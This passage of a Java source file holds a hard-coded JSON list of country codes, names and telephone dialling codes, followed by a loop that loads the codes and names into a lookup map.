\"MU\", \"country_name\": \"Mauritius\", \"dialling_code\": \"+230\" }, { \"country_code\": \"YT\", \"country_name\": \"Mayotte\", \"dialling_code\": \"+262\" }, { \"country_code\": \"MX\", \"country_name\": \"Mexico\", \"dialling_code\": \"+52\" }, { \"country_code\": \"MD\", \"country_name\": \"Moldova\", \"dialling_code\": \"+373\" }, { \"country_code\": \"MC\", \"country_name\": \"Monaco\", \"dialling_code\": \"+377\" }, { \"country_code\": \"MN\", \"country_name\": \"Mongolia\", \"dialling_code\": \"+976\" }, { \"country_code\": \"ME\", \"country_name\": \"Montenegro\", \"dialling_code\": \"+382\" }, { \"country_code\": \"MS\", \"country_name\": \"Montserrat\", \"dialling_code\": \"+1\" }, { \"country_code\": \"MA\", \"country_name\": \"Morocco\", \"dialling_code\": \"+212\" }, { \"country_code\": \"MZ\", \"country_name\": \"Mozambique\", \"dialling_code\": \"+258\" }, { \"country_code\": \"NA\", \"country_name\": \"Namibia\", \"dialling_code\": \"+264\" }, { \"country_code\": \"NR\", \"country_name\": \"Nauru\", \"dialling_code\": \"+674\" }, { \"country_code\": \"NP\", \"country_name\": \"Nepal\", \"dialling_code\": \"+977\" }, { \"country_code\": \"NL\", \"country_name\": \"Netherlands\", \"dialling_code\": \"+31\" }, { \"country_code\": \"AN\", \"country_name\": \"Netherlands Antilles\", \"dialling_code\": \"+599\" }, { \"country_code\": \"NC\", \"country_name\": \"New Caledonia\", \"dialling_code\": \"+687\" }, { \"country_code\": \"NZ\", \"country_name\": \"New Zealand\", \"dialling_code\": \"+64\" }, { \"country_code\": \"NI\", \"country_name\": \"Nicaragua\", \"dialling_code\": \"+505\" }, { \"country_code\": \"NE\", \"country_name\": \"Niger\", \"dialling_code\": \"+227\" }, { \"country_code\": \"NG\", \"country_name\": \"Nigeria\", \"dialling_code\": \"+234\" }, { \"country_code\": \"NU\", \"country_name\": \"Niue\", \"dialling_code\": \"+683\" }, { \"country_code\": \"NF\", \"country_name\": \"Norfolk Island\", \"dialling_code\": \"+672\" }, { \"country_code\": \"KP\", \"country_name\": \"North Korea\", \"dialling_code\": \"+850\" }, { \"country_code\": \"MP\", \"country_name\": \"Northern Mariana Islands\", \"dialling_code\": \"+1\" }, { \"country_code\": \"NO\", \"country_name\": \"Norway\", \"dialling_code\": \"+47\" }, { \"country_code\": \"OM\", \"country_name\": \"Oman\", \"dialling_code\": \"+968\" }, { \"country_code\": \"PK\", \"country_name\": \"Pakistan\", \"dialling_code\": \"+92\" }, { \"country_code\": \"PW\", \"country_name\": \"Palau\", \"dialling_code\": \"+680\" }, { \"country_code\": \"PS\", \"country_name\": \"Palestine\", \"dialling_code\": \"+970\" }, { \"country_code\": \"PA\", \"country_name\": \"Panama\", \"dialling_code\": \"+507\" }, { \"country_code\": \"PG\", \"country_name\": \"Papua New Guinea\", \"dialling_code\": \"+675\" }, { \"country_code\": \"PY\", \"country_name\": \"Paraguay\", \"dialling_code\": \"+595\" }, { \"country_code\": \"PE\", \"country_name\": \"Peru\", \"dialling_code\": \"+51\" }, { \"country_code\": \"PH\", \"country_name\": \"Philippines\", \"dialling_code\": \"+63\" }, { \"country_code\": \"PL\", \"country_name\": \"Poland\", \"dialling_code\": \"+48\" }, { \"country_code\": \"PT\", \"country_name\": \"Portugal\", \"dialling_code\": \"+351\" }, { \"country_code\": \"PR\", \"country_name\": \"Puerto Rico\", \"dialling_code\": \"+1\" }, { \"country_code\": \"QA\", \"country_name\": \"Qatar\", \"dialling_code\": \"+974\" }, { \"country_code\": \"CG\", \"country_name\": \"Republic of the Congo\", \"dialling_code\": \"+242\" }, { \"country_code\": \"RE\", \"country_name\": \"R\u00E9union\", \"dialling_code\": \"+262\" }, { \"country_code\": \"RO\", \"country_name\": \"Romania\", \"dialling_code\": \"+40\" }, { \"country_code\": \"RU\", \"country_name\": \"Russia\", \"dialling_code\": \"+7\" }, { \"country_code\": \"RW\", \"country_name\": \"Rwanda\", \"dialling_code\": \"+250\" }, { \"country_code\": \"BL\", \"country_name\": \"Saint Barth\u00E9lemy\", \"dialling_code\": \"+590\" }, { \"country_code\": \"SH\", \"country_name\": \"Saint Helena\", \"dialling_code\": \"+290\" }, { \"country_code\": \"KN\", \"country_name\": \"Saint Kitts and Nevis\", \"dialling_code\": \"+1\" }, { \"country_code\": \"MF\", \"country_name\": \"Saint Martin\", \"dialling_code\": \"+590\" }, { \"country_code\": \"PM\", \"country_name\": \"Saint Pierre and Miquelon\", \"dialling_code\": \"+508\" }, { \"country_code\": \"VC\", \"country_name\": \"Saint Vincent and the Grenadines\", \"dialling_code\": \"+1\" }, { \"country_code\": \"WS\", \"country_name\": \"Samoa\", \"dialling_code\": \"+685\" }, { \"country_code\": \"SM\", \"country_name\": \"San Marino\", \"dialling_code\": \"+378\" }, { \"country_code\": \"ST\", \"country_name\": \"S\u00E3o Tom\u00E9 and Pr\u00EDncipe\", \"dialling_code\": \"+239\" }, { \"country_code\": \"SA\", \"country_name\": \"Saudi Arabia\", \"dialling_code\": \"+966\" }, { \"country_code\": \"SN\", \"country_name\": \"Senegal\", \"dialling_code\": \"+221\" }, { \"country_code\": \"RS\", \"country_name\": \"Serbia\", \"dialling_code\": \"+381\" }, { \"country_code\": \"SC\", \"country_name\": \"Seychelles\", \"dialling_code\": \"+248\" }, { \"country_code\": \"SL\", \"country_name\": \"Sierra Leone\", \"dialling_code\": \"+232\" }, { \"country_code\": \"SG\", \"country_name\": \"Singapore\", \"dialling_code\": \"+65\" }, { \"country_code\": \"SK\", \"country_name\": \"Slovakia\", \"dialling_code\": \"+421\" }, { \"country_code\": \"SI\", \"country_name\": \"Slovenia\", \"dialling_code\": \"+386\" }, { \"country_code\": \"SB\", \"country_name\": \"Solomon Islands\", \"dialling_code\": \"+677\" }, { \"country_code\": \"SO\", \"country_name\": \"Somalia\", \"dialling_code\": \"+252\" }, { \"country_code\": \"ZA\", \"country_name\": \"South Africa\", \"dialling_code\": \"+27\" }, { \"country_code\": \"KR\", \"country_name\": \"South Korea\", \"dialling_code\": \"+82\" }, { \"country_code\": \"ES\", \"country_name\": \"Spain\", \"dialling_code\": \"+34\" }, { \"country_code\": \"LK\", \"country_name\": \"Sri Lanka\", \"dialling_code\": \"+94\" }, { \"country_code\": \"LC\", \"country_name\": \"St. Lucia\", \"dialling_code\": \"+1\" }, { \"country_code\": \"SD\", \"country_name\": \"Sudan\", \"dialling_code\": \"+249\" }, { \"country_code\": \"SR\", \"country_name\": \"Suriname\", \"dialling_code\": \"+597\" }, { \"country_code\": \"SZ\", \"country_name\": \"Swaziland\", \"dialling_code\": \"+268\" }, { \"country_code\": \"SE\", \"country_name\": \"Sweden\", \"dialling_code\": \"+46\" }, { \"country_code\": \"CH\", \"country_name\": \"Switzerland\", \"dialling_code\": \"+41\" }, { \"country_code\": \"SY\", \"country_name\": \"Syria\", \"dialling_code\": \"+963\" }, { \"country_code\": \"TW\", \"country_name\": \"Taiwan\", \"dialling_code\": \"+886\" }, { \"country_code\": \"TJ\", \"country_name\": \"Tajikistan\", \"dialling_code\": \"+992\" }, { \"country_code\": \"TZ\", \"country_name\": \"Tanzania\", \"dialling_code\": \"+255\" }, { \"country_code\": \"TH\", \"country_name\": \"Thailand\", \"dialling_code\": \"+66\" }, { \"country_code\": \"BS\", \"country_name\": \"The Bahamas\", \"dialling_code\": \"+1\" }, { \"country_code\": \"GM\", \"country_name\": \"The Gambia\", \"dialling_code\": \"+220\" }, { \"country_code\": \"TL\", \"country_name\": \"Timor-Leste\", \"dialling_code\": \"+670\" }, { \"country_code\": \"TG\", \"country_name\": \"Togo\", \"dialling_code\": \"+228\" }, { \"country_code\": \"TK\", \"country_name\": \"Tokelau\", \"dialling_code\": \"+690\" }, { \"country_code\": \"TO\", \"country_name\": \"Tonga\", \"dialling_code\": \"+676\" }, { \"country_code\": \"TT\", \"country_name\": \"Trinidad and Tobago\", \"dialling_code\": \"+1\" }, { \"country_code\": \"TN\", \"country_name\": \"Tunisia\", \"dialling_code\": \"+216\" }, { \"country_code\": \"TR\", \"country_name\": \"Turkey\", \"dialling_code\": \"+90\" }, { \"country_code\": \"TM\", \"country_name\": \"Turkmenistan\", \"dialling_code\": \"+993\" }, { \"country_code\": \"TC\", \"country_name\": \"Turks and Caicos Islands\", \"dialling_code\": \"+1\" }, { \"country_code\": \"TV\", \"country_name\": \"Tuvalu\", \"dialling_code\": \"+688\" }, { \"country_code\": \"UG\", \"country_name\": \"Uganda\", \"dialling_code\": \"+256\" }, { \"country_code\": \"UA\", \"country_name\": \"Ukraine\", \"dialling_code\": \"+380\" }, { \"country_code\": \"AE\", \"country_name\": \"United Arab Emirates\", \"dialling_code\": \"+971\" }, { \"country_code\": \"GB\", \"country_name\": \"United Kingdom\", \"dialling_code\": \"+44\" }, { \"country_code\": \"US\", \"country_name\": \"United States\", \"dialling_code\": \"+1\" }, { \"country_code\": \"UY\", \"country_name\": \"Uruguay\", \"dialling_code\": \"+598\" }, { \"country_code\": \"VI\", \"country_name\": \"US Virgin Islands\", \"dialling_code\": \"+1\" }, { \"country_code\": \"UZ\", \"country_name\": \"Uzbekistan\", \"dialling_code\": \"+998\" }, { \"country_code\": \"VU\", \"country_name\": \"Vanuatu\", \"dialling_code\": \"+678\" }, { \"country_code\": \"VA\", \"country_name\": \"Vatican City\", \"dialling_code\": \"+39\" }, { \"country_code\": \"VE\", \"country_name\": \"Venezuela\", \"dialling_code\": \"+58\" }, { \"country_code\": \"VN\", \"country_name\": \"Vietnam\", \"dialling_code\": \"+84\" }, { \"country_code\": \"WF\", \"country_name\": \"Wallis and Futuna\", \"dialling_code\": \"+681\" }, { \"country_code\": \"YE\", \"country_name\": \"Yemen\", \"dialling_code\": \"+967\" }, { \"country_code\": \"ZM\", \"country_name\": \"Zambia\", \"dialling_code\": \"+260\" }, { \"country_code\": \"ZW\", \"country_name\": \"Zimbabwe\", \"dialling_code\": \"+263\" } ]");
    JSONArray ja = (JSONArray)obj;
    for (Object c : ja) {
      JSONObject jsonobject = (JSONObject)c;
      this.CodesToNames.put((String)jsonobject.get("country_code"), (String)jsonobject.get("country_name"));
    } 
  }
}

